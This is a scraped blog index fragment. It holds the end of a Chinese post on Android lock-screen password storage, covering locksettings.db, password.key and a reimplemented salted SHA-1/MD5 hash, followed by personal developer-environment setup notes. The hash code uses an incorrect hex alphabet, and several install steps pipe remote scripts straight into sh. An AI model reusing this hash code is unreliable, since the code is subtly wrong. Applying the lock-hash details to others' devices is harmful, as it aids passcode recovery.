@Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int currentVersion) { int upgradeVersion = oldVersion; if (upgradeVersion == 1) { // Previously migrated lock screen widget settings. Now defunct. upgradeVersion = 2; } if (upgradeVersion != DATABASE_VERSION) { Log.w(TAG, \u0026#34;Failed to upgrade database!\u0026#34;); } } } 看到了数据库的名字叫作：locksettings.db 保存在了：\n1 2 3 4 5 6 7 8 private static final String SYSTEM_DIRECTORY = \u0026#34;/system/\u0026#34;; //目录 private static final String LOCK_PATTERN_FILE = \u0026#34;gatekeeper.pattern.key\u0026#34;; private static final String BASE_ZERO_LOCK_PATTERN_FILE = \u0026#34;gatekeeper.gesture.key\u0026#34;; private static final String LEGACY_LOCK_PATTERN_FILE = \u0026#34;gesture.key\u0026#34;; //key1 private static final String LOCK_PASSWORD_FILE = \u0026#34;gatekeeper.password.key\u0026#34;; private static final String LEGACY_LOCK_PASSWORD_FILE = \u0026#34;password.key\u0026#34;; //key2 private static final String CHILD_PROFILE_LOCK_FILE = \u0026#34;gatekeeper.profile.key\u0026#34;; private static final String SYNTHETIC_PASSWORD_DIRECTORY = \u0026#34;spblob/\u0026#34;; 数据库文件存在/data/system/locksetting.db\n测试 在/data/system/下看到password.key\n打开看看：\n手动简单实现加密算法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public byte[] passwordToHash(String password) { if (password == null) { return null; } byte [] hashed = null; try { byte[] saltedPassword = (password + SALT).getBytes(); //SALT 值从数据库中得到 拿到之后进行hex转换 byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); hashed = (toHex(sha1)+toHex(md5)).getBytes(); } catch(Exception e){ } return hashed; } private static String toHex(byte[] ary){ final String hex = \u0026#34;102031398sjdfklaj\u0026#34;; String ret = \u0026#34;\u0026#34;; for(int i=0;i\u0026lt;ary.length;i++){ ret += hex.charAt((ary[i]\u0026gt;\u0026gt; 4)\u0026amp; 0xf); ret += hex.charAt(ary[i]\u0026amp; 0xf); } return ret; } SALT 的值可以从数据库中拿到 也可以利用反射获取\n总结：\n​ MD5(输的明文密码+设备的salt).hex+ SHA1(输的的明文密码+设备的salt值).hex\n2.2 手势密码分析\n大致同上\n3. 简要： ​ 九宫格团装化成字节数组-\u0026gt;sha1 加密 即可\n其实大致流程和分析输入密码差不多 保存到本地的目录/data/system/gesture.key 文件\n","date":"2018-07-02T17:33:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%871/","title":"Android应用安全防护和逆向分析-基础篇1"},{"content":"EnvRecord 用来不时记录平时所用环境配置，以及遇到的各种问题以及解决办法。主要是为了防丢失，以及总是和空气斗志斗勇。\nWin10 日常使用\nWSL 默认不是root 设置默认root用户。ubuntu config --default-user root\non my zsh 装上\n官方github\n需要先安装ZSH。\n安装on my zsh:\nvia curl：sh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026quot;\nvia wget: sh -c \u0026quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)\u0026quot;\n然后配置喜欢的 插件+主题。vi ~/.zshrc 修改plugins属性\n必备插件git、autojump、zsh-autosuggestions。主题 经常使用ys\nGDB装上+pwndbg+peda+gef\nwsl的ubuntu不支持x86，所以主要只能调试x64的程序，而且可能会出现莫名其妙的错误。\n不过可以使用qemu来运行x86的程序，调试还是不行会出错。参考\n1 2 3 4 5 sudo apt update sudo apt install qemu-user-static sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic \u0026#39;\\x7fELF\\x01\\x01\\x01\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x03\\x00\\x01\\x00\\x00\\x00\u0026#39; --mask \u0026#39;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfc\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf8\\xff\\xff\\xff\\xff\\xff\\xff\\xff\u0026#39; # 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。 sudo service binfmt-support start pwndbg+peda+gef\n三个都可能用到，三个工具特性不一样。各有强项，所以三个都装，使用脚本gdb.sh启动选项\n安装pwndbg:\n1 2 3 git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh peda:\n1 2 git clone https://github.com/longld/peda.git ~/peda echo \u0026#34;source ~/peda/peda.py\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit gef:\n1 2 3 4 5 6 # via the install script $ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh # manually $ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py $ echo source ~/.gdbinit-gef.py \u0026gt;\u0026gt; ~/.gdbinit gdb.sh 把该文件放在/usr/local/sbin 参考\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 #!/bin/bash function Mode_change { name=$1 gdbinitfile=~/.gdbinit#这个路径按照你的实际情况修改# gdbinitfile=/root/Desktop/mode#路径按照你的实际情况修改 peda=\u0026#34;source ~/peda/peda.py\u0026#34; gef=\u0026#34;source ~/.gdbinit-gef.py\u0026#34; pwndbg=\u0026#34;source /home/pwndbg/gdbinit.py\u0026#34; sign=$(cat $gdbinitfile | grep -n \u0026#34;#this place is controled by user\u0026#39;s shell\u0026#34;) #此处上面的查找内容要和你自己的保持一致 pattern=\u0026#34;:#this place is controled by user\u0026#39;s shell\u0026#34; number=${sign%$pattern} location=$[number+2] parameter_add=${location}i parameter_del=${location}d message=\u0026#34;TEST\u0026#34; if [ $name -eq \u0026#34;1\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $peda\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the peda!\\n\u0026#34; elif [ $name -eq \u0026#34;2\u0026#34; ];then sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $gef\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the gef!\\n\u0026#34; else sed -i \u0026#34;$parameter_del\u0026#34; $gdbinitfile sed -i \u0026#34;$parameter_add $pwndbg\u0026#34; $gdbinitfile echo -e \u0026#34;Please enjoy the pwndbg!\\n\u0026#34; fi } echo -e \u0026#34;Please choose one mode of GDB?\\n1.peda 2.gef 3.pwndbg\u0026#34; read -p \u0026#34;Input your choice:\u0026#34; num if [ $num -eq \u0026#34;1\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;2\u0026#34; ];then Mode_change $num elif [ $num -eq \u0026#34;3\u0026#34; ];then Mode_change $num else echo -e \u0026#34;Error!\\nPleasse input right number!\u0026#34; fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9# r2全家桶 （逆向调试神器）\n1 2 3 git clone https://github.com/radare/radare2.git cd radare2 sys/install.sh#Install / Update gcc arm aarch aarch64\nsudo apt install gcc-arm-linux-gnueabi 使用命令arm-linux-gnueabi-gcc\nsudo apt install gcc-aarch64-linux-gnu 使用命令aarch64-linux-gnu-gcc\nclang+llvm\n方法一，手动编译安装，费时费力\n方法二 apt\n完整方法这个地址\n只写ubuntu 18,04\n编辑 /etc/apt/sources.list，添加源 1 2 3 4 5 6 7 8 9 # i386 not available deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic main # 7 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-7 main # 8 deb http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main deb-src http://apt.llvm.org/bionic/ llvm-toolchain-bionic-8 main 添加证书 1 2 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add - # Fingerprint: 6084 F3CF 814B 57C1 CF12 EFD5 15CF 4D18 AF4F 7421 安装 版本8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # LLVM apt-get install libllvm-8-ocaml-dev libllvm8 llvm-8 llvm-8-dev llvm-8-doc llvm-8-examples llvm-8-runtime # Clang and co apt-get install clang-8 clang-tools-8 clang-8-doc libclang-common-8-dev libclang-8-dev libclang1-8 clang-format-8 python-clang-8 # libfuzzer apt-get install libfuzzer-8-dev # lldb apt-get install lldb-8 # lld (linker) apt-get install lld-8 # libc++ apt-get install libc++-8-dev libc++abi-8-dev # OpenMP apt-get install libomp-8-dev python3+pip\napt install python3 python3-pip、python-pip\npython库\nfrida （hook) 同win下使用\npwntools (py2)\ngmpy2 (py2-3)\nr2Frida\nBrida\nvscode （666） 主要是各种插件\nzh-ch （汉化包）\nbackground （右下角小萌人）\ncmder** (Win下强大的终端工具)** 官网下载安装\n简单配置：\nwsl vim 无法使用上下左右键解决\npy2-py3 官网找想要的包下载，同时装两个版本。\n修改环境变量，日常使用py3,把py3的环境变量放在前面，去py2的安装目录复制一份python.exe 更名为python2.exe，就可以使用python2作为命令输入。\npip配置为国内源会快很多\nJava8+jdk最新 官网下载安装\n下个jdk最新版防止部分工具需要。\n可能有时候还需要配置环境变量JAVA_HOME为JDK路径。\nGolang 也是只需下载安装就ok.\nNodeJS 也是只需下载安装就ok. 推荐稳定版。\n会默认安装npm，然而下载速度实在太慢，使用淘宝镜像cnpm ,用法相同\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\ngit 官网下载安装完事\nYarn 官网下载安装完事\nCMake 下载安装ok\nhugo (博客工具) 下载exe到本地，配置环境变量\nHaskell Stack 官方文档、win直接下载安装\nStartlsBack (win下的美化工具) 下载安装 配置底部透明和居中\nNotepad++ (轻便的编辑器) 下载安装\nAndroid SDK 配置 adb工具 在目录platform-tools\nemulator、monitor 在tools下\nNDK-build 在ndk-bundle\nflutter (Google 跨平台框架) 有官网了\n下载SDK-\u0026gt;配置环境变量 flutter\\bin 。添加名为”PUB_HOSTED_URL”和”FLUTTER_STORAGE_BASE_URL”的条目。\nAndorid Studio设置\n安装插件\nFlutter插件： 支持Flutter开发工作流 (运行、调试、热重载等).\nDart插件： 提供代码分析 (输入代码时进行验证、代码补全等).\nVScode设置\n安装插件\nflutter Genymotion+逍遥Android (Android 模拟器) 下载安装ok\nCUDA （N卡xxx) 根据自己的显卡官网下载包\n根据需求安装。\n有个坑，如果为pytorch 或TensorFlow做前提 先看看这两支持的版本再安装相应的版本。\npytorch 需求前置环境也得装好 官方有很方便的安装方法 根据不同平台和环境\nTensorFlow 前置环境查官网 1 2 3 4 5 # GPU版本 py3 pip3 install tensorflow-gpu# stable pip3 install tf-nightly-gpu# preview pip3 install tensorflow-gpu==2.0.0-alpha0##TensorFlow 2.0 Alpha# CPU 版本 pip3 install --user --upgrade tensorflow tensorflow - 仅支持 CPU 的最新稳定版（建议新手使用）\ntensorflow-gpu - 支持 GPU 的最新稳定版（适用于 Ubuntu 和 Windows）\ntf-nightly - 仅支持 CPU 的预览每夜版（不稳定）\ntf-nightly-gpu - 支持 GPU 的预览每夜版（不稳定，适用于 Ubuntu 和 Windows）\ntensorflow==2.0.0-alpha0 - 仅支持 CPU 的预览 TF 2.0 Alpha 版（不稳定）\ntensorflow-gpu==2.0.0-alpha0 - 支持 GPU 的预览 TF 2.0 Alpha 版（不稳定，Ubuntu 和 Windows）\nVMware pro （虚拟机） 装MacOS记录 VBox （虚拟机） 安装拓展包 Xshell、Xftp (free for Home/School) free 的要去官网下载 填写信息，邮箱打开链接下载。\nTeamViewer (远程连接) 各种IDE、集成环境 只记录 Visual Studio 2019\nPycharm\nIDEA\n微信web开发工具\nphpStudy\nAndroid Studio (风扇~~ ~~)\nOther 不做记录\nUbuntu 18.04 一般用来调代码。 大部分配置同上面WSL,只记录不做过多介绍\non my zsh gdb+pwndbg+peda+gef 美化 manjaro 很喜欢的Linux发行版。基于ArchLinux，软件多，好看又好用。\nMac m2 没法用 放弃 等等 ","date":"0001-01-01T00:00:00Z","permalink":"https://ykiko.top/p/envrecord/","title":"EnvRecord"}]